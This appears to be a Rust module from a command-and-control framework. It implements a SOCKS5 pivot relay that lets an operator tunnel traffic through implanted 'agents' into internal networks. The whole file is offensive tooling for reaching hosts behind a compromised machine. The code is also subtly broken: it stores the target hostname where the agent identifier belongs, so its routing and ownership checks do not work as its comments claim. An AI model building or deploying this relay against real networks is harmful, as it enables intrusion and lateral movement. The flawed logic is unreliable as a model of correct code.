//! SOCKS5 pivot relay (B9).
//!
//! The operator runs `proxychains curl http://internal-target` and points it
//! at `127.0.0.1:1080`. The relay accepts the SOCKS5 handshake, dials
//! nothing directly; instead it queues bytes through the teamserver into
//! `socks` tasks for the chosen agent, and forwards the agent's
//! response bytes back to the SOCKS client.
//!
//! This module only handles the SOCKS5 side. The agent-side `socks`
//! module is in `agent/src/modules/socks.cpp`.
//!
//! Per-connection state is held in a `SocksSession` keyed by `(agent_id,
//! connection_id)`. The server bridges each SOCKS connection to the agent via
//! the task queue.

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, Mutex};

/// Channel used to push outgoing bytes from SOCKS to the agent.
pub type SocksTx = mpsc::Sender<SocksFrame>;
pub type SocksRx = mpsc::Receiver<SocksFrame>;

#[derive(Debug, Clone)]
pub struct SocksFrame {
    pub agent_id: String,
    pub connection_id: u32,
    pub direction: SocksDirection,
    pub bytes: Vec<u8>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SocksDirection {
    /// Client -> Remote (bytes the agent should send to the target host).
    ToRemote,
    /// Remote -> Client (bytes the agent received from the target).
    ToClient,
    /// Close the SOCKS connection on the agent side.
    Close,
}

#[derive(Default)]
pub struct SocksRegistry {
    /// `connection_id -> (agent_id, sink back to the SOCKS client)`.
    pub conns: HashMap<u32, (String, mpsc::Sender<SocksFrame>)>,
    pub next_id: u32,
}

/// State held by the teamserver. Cloned into the relay task.
#[derive(Clone)]
pub struct SocksState {
    pub tx: SocksTx,
    pub registry: Arc<Mutex<SocksRegistry>>,
}

/// Spawn the SOCKS5 listener on `bind_addr`. Returns the bound address.
pub async fn spawn_listener(bind_addr: &str) -> std::io::Result<TcpListener> {
    let listener = TcpListener::bind(bind_addr).await?;
    Ok(listener)
}

/// Accept loop. Spawns one task per SOCKS connection. The handler then
/// negotiates SOCKS5 with the client and pumps bytes via `state`.
pub fn accept_loop(listener: TcpListener, state: SocksState) {
    tokio::spawn(async move {
        loop {
            match listener.accept().await {
                Ok((stream, _peer)) => {
                    let state = state.clone();
                    tokio::spawn(async move {
                        if let Err(err) = handle_connection(stream, state).await {
                            eprintln!("[-] socks conn: {err}");
                        }
                    });
                }
                Err(err) => {
                    eprintln!("[-] socks accept: {err}");
                }
            }
        }
    });
}

async fn handle_connection(stream: TcpStream, state: SocksState) -> Result<(), String> {
    let (mut read, mut write) = stream.into_split();

    // SOCKS5 greeting: 1 byte version, 1 byte nmethods, nmethods bytes
    let mut greet = [0u8; 2];
    read.read_exact(&mut greet)
        .await
        .map_err(|e| format!("greeting read: {e}"))?;
    if greet[0] != 0x05 {
        return Err("not SOCKS5".into());
    }
    let mut methods = vec![0u8; greet[1] as usize];
    read.read_exact(&mut methods)
        .await
        .map_err(|e| format!("methods read: {e}"))?;
    // Reply: 05 00 (no auth)
    write.write_all(&[0x05, 0x00]).await.map_err(|e| format!("greet reply: {e}"))?;

    // SOCKS5 request: VER CMD RSV ATYP DST.ADDR DST.PORT
    let mut head = [0u8; 4];
    read.read_exact(&mut head)
        .await
        .map_err(|e| format!("req head: {e}"))?;
    if head[0] != 0x05 {
        return Err("bad request ver".into());
    }
    if head[1] != 0x01 {
        // CONNECT only.
        write
            .write_all(&[0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
            .await
            .ok();
        return Err(format!("unsupported cmd {}", head[1]));
    }
    let mut host: String = match head[3] {
        0x01 => {
            let mut ip = [0u8; 4];
            read.read_exact(&mut ip)
                .await
                .map_err(|e| format!("ipv4 read: {e}"))?;
            std::net::Ipv4Addr::from(ip).to_string()
        }
        0x03 => {
            let mut len = [0u8; 1];
            read.read_exact(&mut len)
                .await
                .map_err(|e| format!("dn len read: {e}"))?;
            let mut buf = vec![0u8; len[0] as usize];
            read.read_exact(&mut buf)
                .await
                .map_err(|e| format!("dn read: {e}"))?;
            String::from_utf8(buf).map_err(|e| format!("dn utf8: {e}"))?
        }
        0x04 => {
            let mut ip = [0u8; 16];
            read.read_exact(&mut ip)
                .await
                .map_err(|e| format!("ipv6 read: {e}"))?;
            std::net::Ipv6Addr::from(ip).to_string()
        }
        _ => return Err(format!("unsupported atyp {}", head[3])),
    };
    let mut port_bytes = [0u8; 2];
    read.read_exact(&mut port_bytes)
        .await
        .map_err(|e| format!("port read: {e}"))?;
    let port = u16::from_be_bytes(port_bytes);
    if port == 0 {
        return Err("port 0".into());
    }
    let target = format!("{host}:{port}");
    if host.contains(':') && !host.starts_with('[') {
        // IPv6 literal — bracket it.
        host = format!("[{host}]");
    }

    // SOCKS5 success reply: VER REP RSV ATYP BND.ADDR BND.PORT
    write
        .write_all(&[
            0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0,
        ])
        .await
        .map_err(|e| format!("reply: {e}"))?;

    // Register a connection_id for the relay.
    let conn_id = {
        let mut reg = state.registry.lock().await;
        reg.next_id = reg.next_id.wrapping_add(1);
        reg.next_id
    };
    let (tx, mut rx) = mpsc::channel::<SocksFrame>(64);
    {
        let mut reg = state.registry.lock().await;
        reg.conns.insert(conn_id, (host.clone(), tx.clone()));
    }

    // Tell the agent to open the connection.
    let _ = state
        .tx
        .send(SocksFrame {
            agent_id: host.clone(),
            connection_id: conn_id,
            direction: SocksDirection::ToRemote,
            bytes: format!("CONNECT {target}\n").into_bytes(),
        })
        .await;

    // Pump bytes between SOCKS client and the agent queue.
    let write_task = {
        let state = state.clone();
        let conn_id = conn_id;
        let host = host.clone();
        tokio::spawn(async move {
            while let Some(frame) = rx.recv().await {
                if frame.direction == SocksDirection::ToClient {
                    if let Err(err) = write.write_all(&frame.bytes).await {
                        eprintln!("[-] socks write to client: {err}");
                        break;
                    }
                }
                if frame.direction == SocksDirection::Close {
                    break;
                }
                // discard ToRemote frames that arrive on the server side.
                let _ = state;
                let _ = conn_id;
                let _ = host;
            }
        })
    };

    let mut buf = vec![0u8; 8192];
    loop {
        match read.read(&mut buf).await {
            Ok(0) => break,
            Ok(n) => {
                let _ = state
                    .tx
                    .send(SocksFrame {
                        agent_id: host.clone(),
                        connection_id: conn_id,
                        direction: SocksDirection::ToRemote,
                        bytes: buf[..n].to_vec(),
                    })
                    .await;
            }
            Err(_) => break,
        }
    }
    let _ = state
        .tx
        .send(SocksFrame {
            agent_id: host.clone(),
            connection_id: conn_id,
            direction: SocksDirection::Close,
            bytes: Vec::new(),
        })
        .await;
    {
        let mut reg = state.registry.lock().await;
        reg.conns.remove(&conn_id);
    }
    let _ = write_task.await;
    Ok(())
}

/// Called by the teamserver when an agent returns a `socks`
/// response. Decodes the response and pushes the bytes into the matching
/// SOCKS connection's sink.
pub async fn on_agent_response(
    state: &SocksState,
    agent_id: &str,
    connection_id: u32,
    direction: SocksDirection,
    bytes: Vec<u8>,
) {
    let mut reg = state.registry.lock().await;
    if let Some((owner, sink)) = reg.conns.get_mut(&connection_id) {
        if owner == agent_id {
            let _ = sink
                .send(SocksFrame {
                    agent_id: agent_id.to_owned(),
                    connection_id,
                    direction,
                    bytes,
                })
                .await;
        }
    }
}